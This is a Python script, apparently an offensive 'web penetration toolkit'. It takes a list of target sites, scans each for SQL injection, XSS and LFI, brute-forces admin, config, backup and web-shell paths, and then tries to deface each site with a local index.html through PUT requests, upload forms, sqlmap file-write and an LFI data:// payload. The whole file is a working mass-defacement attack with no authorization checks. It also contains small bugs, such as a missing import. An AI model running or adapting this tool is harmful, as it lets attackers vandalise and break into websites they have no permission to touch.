#!/usr/bin/env python3
"""
ULTIMATE WEB PENETRATION TOOLKIT
Features:
- SQL Injection (sqlmap, Ghauri)
- XSS Scanning (Dalfox, XSStrike)
- LFI/RFI Testing
- Auto-uploader discovery
- CMS-specific exploits
- Advanced path brute-forcing
- Multi-tool integration
"""

import os
import sys
import requests
import random
import subprocess
import json
from concurrent.futures import ThreadPoolExecutor
from urllib.parse import urljoin, urlparse

# Configuration
MAX_THREADS = 20
TIMEOUT = 25
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Mozilla/5.0 (Linux; Android 10; SM-G975F)'
]

# Integrated GitHub Tools
TOOLS = {
    'sqlmap': {'url': 'https://github.com/sqlmapproject/sqlmap', 'cmd': 'python sqlmap.py -u {target} --batch'},
    'ghauri': {'url': 'https://github.com/r0oth3x49/ghauri', 'cmd': 'python3 ghauri.py -u {target}'},
    'dalfox': {'url': 'https://github.com/hahwul/dalfox', 'cmd': 'dalfox url {target}'},
    'xssstrike': {'url': 'https://github.com/s0md3v/XSStrike', 'cmd': 'python3 xsstrike.py -u {target}'},
    'liffy': {'url': 'https://github.com/rotlogix/liffy', 'cmd': 'python2 liffy.py -u {target}'}
}

# Enhanced Path Database
COMMON_PATHS = [
    # Admin interfaces
    'admin/', 'admin.php', 'admin/login', 'admincp/', 'administrator/', 
    'wp-admin/', 'wp-login.php', 'manager/', 'webadmin/', 'controlpanel/',
    
    # File upload paths
    'upload.php', 'uploads/', 'filemanager/', 'assets/upload.php',
    'inc/uploads/', 'media/upload.php', 'user/upload', 'ajax/upload',
    
    # CMS-specific
    'joomla/administrator', 'drupal/admin', 'magento/admin', 
    'wordpress/wp-admin', 'phpmyadmin/', 'adminer.php',
    
    # API endpoints
    'api/v1', 'graphql', 'rest/', 'v2/api-docs', 'swagger-ui.html',
    
    # Configuration files
    '.env', 'config.php', 'configuration.ini', 'web.config',
    'appsettings.json', 'database.yml', 'secrets.xml',
    
    # Backup files
    'backup.zip', 'backup.sql', 'dump.tar.gz', 'site.bak',
    
    # Shell locations
    'cmd.php', 'shell.php', 'c99.php', 'r57.php', 'wso.php'
]

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    WHITE = '\033[97m'
    RESET = '\033[0m'

class UltimateHackTool:
    def __init__(self):
        self.session = requests.Session()
        self.session.headers.update({'User-Agent': random.choice(USER_AGENTS)})
        self.session.verify = False
        self.results = []
        self.tools_installed = self._check_tools()

    def _check_tools(self):
        """Verify installed tools"""
        installed = {}
        for tool, config in TOOLS.items():
            try:
                subprocess.run(f"{tool} --help", shell=True, check=True, 
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                installed[tool] = True
            except:
                installed[tool] = False
                print(f"{Colors.YELLOW}[!] {tool} not installed (get it from {config['url']}){Colors.RESET}")
        return installed

    def _run_tool(self, tool, target):
        """Execute security tool"""
        if not self.tools_installed.get(tool, False):
            return False
            
        cmd = TOOLS[tool]['cmd'].format(target=target)
        try:
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            return result.stdout
        except Exception as e:
            print(f"{Colors.RED}[-] {tool} error: {str(e)}{Colors.RESET}")
            return None

    def _scan_vulnerabilities(self, url):
        """Run comprehensive vulnerability scans"""
        print(f"{Colors.BLUE}[*] Scanning {url}{Colors.RESET}")
        
        # SQL Injection
        if self.tools_installed['sqlmap']:
            sql_result = self._run_tool('sqlmap', url)
            if sql_result and "sql injection" in sql_result.lower():
                self.results.append({'type': 'SQLi', 'url': url, 'tool': 'sqlmap'})
        
        # XSS
        if self.tools_installed['dalfox']:
            xss_result = self._run_tool('dalfox', url)
            if xss_result and "vulnerable" in xss_result.lower():
                self.results.append({'type': 'XSS', 'url': url, 'tool': 'dalfox'})
        
        # LFI/RFI
        if self.tools_installed['liffy']:
            lfi_result = self._run_tool('liffy', url)
            if lfi_result and "vulnerable" in lfi_result.lower():
                self.results.append({'type': 'LFI/RFI', 'url': url, 'tool': 'liffy'})

    def _bruteforce_paths(self, base_url):
        """Discover hidden paths"""
        found_paths = []
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            futures = []
            for path in COMMON_PATHS:
                full_url = urljoin(base_url, path)
                futures.append(executor.submit(self._check_path, full_url))
            
            for future in as_completed(futures):
                if result := future.result():
                    found_paths.append(result)
                    print(f"{Colors.GREEN}[+] Found: {result}{Colors.RESET}")
        return found_paths

    def _check_path(self, url):
        """Check if path exists"""
        try:
            r = self.session.head(url, timeout=TIMEOUT)
            if r.status_code == 200:
                return url
        except:
            pass
        return None

    def _deface_site(self, url):
        """Attempt multiple defacement methods"""
        methods = [
            self._try_put_deface,
            self._try_post_upload,
            self._try_sql_upload,
            self._try_lfi_upload
        ]
        
        for method in methods:
            if method(url):
                return True
        return False

    def _try_put_deface(self, url):
        """Direct PUT method"""
        target_url = urljoin(url, "index.html")
        try:
            with open('index.html', 'rb') as f:
                r = self.session.put(target_url, data=f, timeout=TIMEOUT)
                if r.status_code in [200, 201, 204]:
                    verify = self.session.get(target_url, timeout=TIMEOUT)
                    if verify.status_code == 200:
                        print(f"{Colors.GREEN}[+] Defaced (PUT): {target_url}{Colors.RESET}")
                        return True
        except:
            pass
        return False

    def _try_post_upload(self, url):
        """Find and use upload forms"""
        upload_paths = [p for p in COMMON_PATHS if 'upload' in p or 'admin' in p]
        
        for path in upload_paths:
            upload_url = urljoin(url, path)
            try:
                with open('index.html', 'rb') as f:
                    files = {'file': ('index.html', f)}
                    r = self.session.post(upload_url, files=files, timeout=TIMEOUT)
                    
                    if r.status_code == 200:
                        verify_url = urljoin(url, "index.html")
                        verify = self.session.get(verify_url, timeout=TIMEOUT)
                        if verify.status_code == 200:
                            print(f"{Colors.GREEN}[+] Defaced via {path}: {verify_url}{Colors.RESET}")
                            return True
            except:
                continue
        return False

    def _try_sql_upload(self, url):
        """Use SQLi to upload shell"""
        if not any(r['type'] == 'SQLi' and r['url'] == url for r in self.results):
            return False
            
        print(f"{Colors.BLUE}[*] Attempting SQLi upload to {url}{Colors.RESET}")
        try:
            cmd = f"python sqlmap.py -u {url} --file-write=index.html --file-dest=/var/www/html/index.html --batch"
            result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
            
            if "successfully written" in result.stdout.lower():
                verify = self.session.get(urljoin(url, "index.html"), timeout=TIMEOUT)
                if verify.status_code == 200:
                    print(f"{Colors.GREEN}[+] Defaced via SQLi: {url}{Colors.RESET}")
                    return True
        except Exception as e:
            print(f"{Colors.RED}[-] SQLi upload failed: {str(e)}{Colors.RESET}")
        return False

    def _try_lfi_upload(self, url):
        """Use LFI to write file"""
        if not any(r['type'] == 'LFI/RFI' and r['url'] == url for r in self.results):
            return False
            
        print(f"{Colors.BLUE}[*] Attempting LFI upload to {url}{Colors.RESET}")
        try:
            # Convert index.html to base64
            with open('index.html', 'rb') as f:
                payload = f.read().hex()
                
            test_url = f"{url}?file=data://text/plain;base64,{payload}"
            r = self.session.get(test_url, timeout=TIMEOUT)
            
            verify = self.session.get(urljoin(url, "index.html"), timeout=TIMEOUT)
            if verify.status_code == 200:
                print(f"{Colors.GREEN}[+] Defaced via LFI: {url}{Colors.RESET}")
                return True
        except Exception as e:
            print(f"{Colors.RED}[-] LFI upload failed: {str(e)}{Colors.RESET}")
        return False

def main():
    # Check requirements
    if not os.path.exists('listsite.txt'):
        print(f"{Colors.RED}[!] Missing listsite.txt{Colors.RESET}")
        return
        
    if not os.path.exists('index.html'):
        print(f"{Colors.RED}[!] Missing index.html{Colors.RESET}")
        return

    # Load targets
    with open('listsite.txt') as f:
        targets = [line.strip() for line in f if line.strip()]

    print(f"""
{Colors.PURPLE}
  ____ _   _ ___ _____ ___ _   _ ____  _____ _   _ _____ 
 / ___| | | |_ _|  ___|_ _| \ | |  _ \| ____| \ | |_   _|
| |   | | | || || |_   | ||  \| | | | |  _| |  \| | | |  
| |___| |_| || ||  _|  | || |\  | |_| | |___| |\  | | |  
 \____|\___/|___|_|   |___|_| \_|____/|_____|_| \_| |_|  
{Colors.RESET}""")

    tool = UltimateHackTool()
    
    # Process targets
    for target in targets:
        print(f"\n{Colors.CYAN}[*] Processing {target}{Colors.RESET}")
        
        # Phase 1: Vulnerability Scanning
        tool._scan_vulnerabilities(target)
        
        # Phase 2: Path Discovery
        found_paths = tool._bruteforce_paths(target)
        
        # Phase 3: Defacement Attempts
        if tool._deface_site(target):
            tool.results.append({'type': 'Defacement', 'url': target, 'status': 'Success'})
        else:
            tool.results.append({'type': 'Defacement', 'url': target, 'status': 'Failed'})

    # Generate report
    print(f"\n{Colors.CYAN}[*] Final Results:{Colors.RESET}")
    for result in tool.results:
        color = Colors.GREEN if result.get('status') == 'Success' else Colors.RED
        print(f"{color}[{result['type']}] {result['url']} {result.get('status', '')}{Colors.RESET}")

if __name__ == "__main__":
    main()
